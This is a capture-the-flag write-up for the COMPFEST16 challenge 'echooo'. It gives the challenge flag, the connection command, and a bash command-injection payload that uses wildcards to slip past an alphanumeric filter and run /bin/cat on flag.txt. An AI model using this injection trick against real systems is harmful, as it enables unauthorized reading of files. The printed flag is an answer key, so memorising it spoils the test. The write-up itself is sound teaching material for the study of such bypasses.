# Title
echooo (500 points)

# Flag
COMPFEST16{3ch0ing_4r0uNd_w1th_sYmb0ls_3bc526845e}

# Description
Program ini akan melakukan echo pada setiap input yang kamu berikan, kecuali karakter alphanumeric. Flag in **flag.txt**

```bash
nc challenges.ctf.compfest.id 20014
```

# Author
Zanark

# Solution
bash command injection with wildcards
```bash
; /???/??? ????.???
```
**;** for escaping echo 
**/???/???** for execute /bin/cat
**????.???** is flag.txt 